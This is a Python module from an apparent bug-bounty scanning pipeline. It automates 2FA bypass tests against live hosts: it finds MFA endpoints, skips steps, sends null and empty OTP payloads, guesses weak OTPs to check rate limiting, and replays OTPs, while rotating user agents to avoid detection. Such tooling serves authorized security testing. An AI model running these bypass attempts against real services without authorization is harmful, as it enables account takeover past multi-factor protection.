#!/usr/bin/env python3
# modules/step37_2fa_bypass.py — 2FA/OTP Bypass Testing V7
# NEW MODULE — 2FA bypass, response manipulation, brute force, backup codes
# Source: Bug Bounty Bootcamp Ch16 — authentication bypass methodology
# MilkyWay Intelligence | Author: Sharlix + M7AI

import re, json, time, urllib.request, urllib.error, urllib.parse
from core.utils import safe_read

# ── 2FA endpoints ─────────────────────────────────────────────────────────────
MFA_PATHS = [
    "/2fa","/mfa","/otp","/verify","/totp","/auth/verify",
    "/api/2fa","/api/mfa","/api/otp","/api/verify",
    "/account/2fa","/account/verify","/security/2fa",
    "/auth/otp","/login/2fa","/login/mfa",
    "/api/auth/2fa","/api/auth/verify","/api/v1/2fa",
]

# ── Common/weak OTP values ────────────────────────────────────────────────────
WEAK_OTPS = [
    "000000","111111","123456","654321","999999","000001",
    "123123","112233","121212","102030","111222","222333",
    "333444","444555","555666","666777","777888","888999",
    "100000","200000","300000","400000","500000","600000",
]

# ── Response manipulation patterns ────────────────────────────────────────────
SUCCESS_PATTERNS = [
    re.compile(r'"success"\s*:\s*true',                re.I),
    re.compile(r'"verified"\s*:\s*true',               re.I),
    re.compile(r'"status"\s*:\s*"(?:ok|success|200)"', re.I),
    re.compile(r'"token"\s*:\s*"[A-Za-z0-9._\-]{20,}"',re.I),
    re.compile(r'"message"\s*:\s*"(?:success|ok|verified)"', re.I),
]

FAIL_PATTERNS = [
    re.compile(r'"success"\s*:\s*false',               re.I),
    re.compile(r'"valid"\s*:\s*false',                 re.I),
    re.compile(r'"error"\s*:\s*"(?:invalid|wrong|incorrect)"', re.I),
    re.compile(r'"message"\s*:\s*"(?:invalid|wrong|expired)"', re.I),
]


class Step37TwoFABypass:
    """
    2FA Bypass engine.
    Bug Bounty Bootcamp Ch16 methodology:
    1. Response manipulation (change false → true in intercept)
    2. OTP brute force (if no rate limiting)
    3. OTP reuse (can same OTP be used twice?)
    4. Backup code enumeration
    5. Skip step (request protected resource directly after step 1 auth)
    6. null/undefined/empty OTP bypass
    """

    def __init__(self, pipeline):
        self.p = pipeline

    def run(self):
        p     = self.p
        out   = p.files.get("twofa_results",
                             f"{p.out}/{p.prefix}_2fa_bypass.txt")
        live  = safe_read(p.files.get("fmt_url",""))[:10]
        found = 0

        if not live:
            p.log.warn("2FA Bypass: no live hosts"); return

        auth_h = self._build_auth(p)
        p.log.info(f"2FA Bypass V7: {len(live)} hosts — skip/brute/null/reuse")

        for host in live[:5]:
            host = host.rstrip("/")

            # Phase 1: Find 2FA endpoints
            mfa_endpoints = self._find_mfa_endpoints(host, auth_h)
            if not mfa_endpoints:
                continue
            p.log.info(f"  2FA endpoints: {len(mfa_endpoints)} on {host[:40]}")

            for ep_url in mfa_endpoints[:5]:
                # Phase 2: Step skip — access resource without completing 2FA
                r = self._test_step_skip(host, ep_url, auth_h, out)
                found += r

                # Phase 3: Null/empty/undefined OTP bypass
                r = self._test_null_bypass(ep_url, auth_h, out)
                found += r

                # Phase 4: Response manipulation check (detect if client-side)
                r = self._test_response_manipulation(ep_url, auth_h, out)
                found += r

                # Phase 5: OTP brute force (check rate limiting first)
                r = self._test_otp_bruteforce(ep_url, auth_h, out)
                found += r

                # Phase 6: OTP reuse
                r = self._test_otp_reuse(ep_url, auth_h, out)
                found += r

            p.bypass.jitter()

        p.log.success(f"2FA Bypass V7: {found} findings")

    # ── Find 2FA endpoints ────────────────────────────────────────────────────
    def _find_mfa_endpoints(self, host: str, auth_h: dict) -> list:
        found = []
        for path in MFA_PATHS:
            url  = host + path
            resp = self._fetch(url, auth_h)
            if resp and resp.get("status",0) in (200,401,403,405,422):
                body = resp.get("body","")
                if any(x in body.lower() for x in
                       ["otp","code","token","verify","2fa","mfa","authenticator"]):
                    found.append(url)
        return found

    # ── Phase 2: Step skip ────────────────────────────────────────────────────
    def _test_step_skip(self, host: str, mfa_url: str,
                         auth_h: dict, out: str) -> int:
        """
        BB Bootcamp Ch16: After step-1 login, try accessing protected
        resources directly without completing 2FA.
        """
        protected = [
            host + "/dashboard",      host + "/api/me",
            host + "/account",        host + "/profile",
            host + "/api/user",       host + "/settings",
            host + "/admin",
        ]
        for url in protected:
            resp = self._fetch(url, auth_h)
            if not resp: continue
            st   = resp.get("status",0)
            body = resp.get("body","")

            # If we get user data without 2FA = bypass
            if st == 200 and any(
                x in body.lower() for x in
                ["email","account","dashboard","profile","username"]
            ):
                detail = (f"2FA Step Skip: accessed {url} without completing "
                          f"2FA step — auth flow incomplete")
                self._save(out,"critical","2FA_STEP_SKIP",url,detail)
                return 1
        return 0

    # ── Phase 3: Null/undefined OTP ──────────────────────────────────────────
    def _test_null_bypass(self, url: str, auth_h: dict, out: str) -> int:
        """
        BB Bootcamp: some implementations skip check if OTP is null/empty.
        """
        null_payloads = [
            {"otp": None},
            {"otp": ""},
            {"otp": "null"},
            {"otp": "undefined"},
            {"otp": 0},
            {"otp": False},
            {"code": None},
            {"token": None},
            {"otp": "000000"},
        ]
        baseline = self._post_json(url, {"otp":"wrong_otp"}, auth_h)
        if not baseline: return 0
        base_body = baseline.get("body","")
        base_st   = baseline.get("status",0)

        for payload in null_payloads:
            resp = self._post_json(url, payload, auth_h)
            if not resp: continue
            body = resp.get("body","")
            st   = resp.get("status",0)

            # Check if null OTP gets a different (possibly successful) response
            is_success = any(p.search(body) for p in SUCCESS_PATTERNS)
            is_diff    = (st != base_st and st == 200) or (body != base_body and is_success)

            if is_diff and is_success:
                detail = (f"2FA Null Bypass: payload={payload} "
                          f"returned success (status={st})")
                self._save(out,"critical","2FA_NULL_BYPASS",url,detail)
                return 1
        return 0

    # ── Phase 4: Response manipulation ───────────────────────────────────────
    def _test_response_manipulation(self, url: str, auth_h: dict, out: str) -> int:
        """
        BB Bootcamp: detect if 2FA validation is done client-side.
        If response contains success:true/false in JSON → manipulatable.
        """
        resp = self._post_json(url, {"otp":"wrong123"}, auth_h)
        if not resp: return 0
        body = resp.get("body","")

        # Client-side validation indicator
        if any(p.search(body) for p in FAIL_PATTERNS):
            detail = (f"2FA Response Manipulation possible: server returns "
                      f"success:false in JSON — intercept and change to true")
            self._save(out,"high","2FA_RESPONSE_MANIP",url,detail)
            return 1
        return 0

    # ── Phase 5: OTP brute force ──────────────────────────────────────────────
    def _test_otp_bruteforce(self, url: str, auth_h: dict, out: str) -> int:
        """
        Test if rate limiting exists on OTP endpoint.
        If no lockout after 10 wrong codes = vulnerable to brute force.
        """
        wrong_count = 0
        blocked     = False

        for otp in WEAK_OTPS[:10]:
            resp = self._post_json(url, {"otp": otp, "code": otp}, auth_h)
            if not resp:
                blocked = True
                break

            st = resp.get("status",0)
            if st in (429, 423, 403):
                blocked = True
                break

            body = resp.get("body","")
            if any(x in body.lower() for x in
                   ["too many","rate limit","locked","blocked","attempts"]):
                blocked = True
                break

            wrong_count += 1

            # Check if accidentally cracked with weak OTP
            if any(p.search(body) for p in SUCCESS_PATTERNS):
                detail = f"2FA cracked with weak OTP: '{otp}'"
                self._save(out,"critical","2FA_WEAK_OTP",url,detail)
                return 1

        if not blocked and wrong_count >= 10:
            detail = (f"2FA No Rate Limit: {wrong_count} attempts accepted "
                      f"without lockout — brute force possible")
            self._save(out,"high","2FA_NO_RATE_LIMIT",url,detail)
            return 1
        return 0

    # ── Phase 6: OTP reuse ────────────────────────────────────────────────────
    def _test_otp_reuse(self, url: str, auth_h: dict, out: str) -> int:
        """
        BB Bootcamp: OTP should be single-use.
        Test if same OTP is accepted multiple times.
        """
        # Use a previously seen OTP pattern (we don't know the real one,
        # but we can check if the endpoint accepts replay of the same value)
        test_otp = "123456"
        r1 = self._post_json(url, {"otp": test_otp}, auth_h)
        if not r1: return 0

        time.sleep(0.5)
        r2 = self._post_json(url, {"otp": test_otp}, auth_h)
        if not r2: return 0

        # If both responses are identical and non-error, OTP might be reusable
        if (r1.get("body","") == r2.get("body","") and
                r1.get("status",0) == r2.get("status",0) and
                r1.get("status",0) not in (400,401,422)):
            detail = (f"2FA OTP Reuse: same OTP '{test_otp}' accepted twice "
                      f"— tokens not invalidated after use")
            self._save(out,"high","2FA_OTP_REUSE",url,detail)
            return 1
        return 0

    # ── Helpers ───────────────────────────────────────────────────────────────
    def _build_auth(self, p) -> dict:
        hdrs = {}
        c = getattr(p.args,"cookie",None) or getattr(p.args,"session",None)
        a = getattr(p.args,"authorization",None) or getattr(p.args,"auth",None)
        j = getattr(p.args,"jwt",None) or getattr(p.args,"_jwt_token",None)
        if c: hdrs["Cookie"] = c
        if a: hdrs["Authorization"] = a if a.startswith("Bearer") else f"Bearer {a}"
        if j and "Authorization" not in hdrs:
            hdrs["Authorization"] = f"Bearer {j}"
        return hdrs

    def _fetch(self, url, auth, timeout=7) -> dict:
        try:
            req  = urllib.request.Request(
                url, headers={**auth, "User-Agent": self.p.bypass.ua()})
            resp = urllib.request.urlopen(req, timeout=timeout)
            return {"status": resp.status,
                    "body":   resp.read(20000).decode("utf-8","ignore")}
        except urllib.error.HTTPError as e:
            try: body = e.read(2000).decode("utf-8","ignore")
            except: body = ""
            return {"status": e.code, "body": body}
        except Exception:
            return None

    def _post_json(self, url, data, auth, timeout=7) -> dict:
        try:
            body = json.dumps(data).encode()
            hdrs = {**auth, "Content-Type":"application/json",
                    "User-Agent": self.p.bypass.ua()}
            req  = urllib.request.Request(url, data=body, headers=hdrs, method="POST")
            resp = urllib.request.urlopen(req, timeout=timeout)
            return {"status": resp.status,
                    "body":   resp.read(20000).decode("utf-8","ignore")}
        except urllib.error.HTTPError as e:
            try: body = e.read(2000).decode("utf-8","ignore")
            except: body = ""
            return {"status": e.code, "body": body}
        except Exception:
            return None

    def _save(self, out, sev, vtype, url, detail, response: str = "", payload: str = ""):
        with open(out,"a") as f:
            f.write(f"{vtype}: {url} | {detail}\n")
        self.p.add_finding(sev, vtype, url, detail, "2fa-bypass-v7")
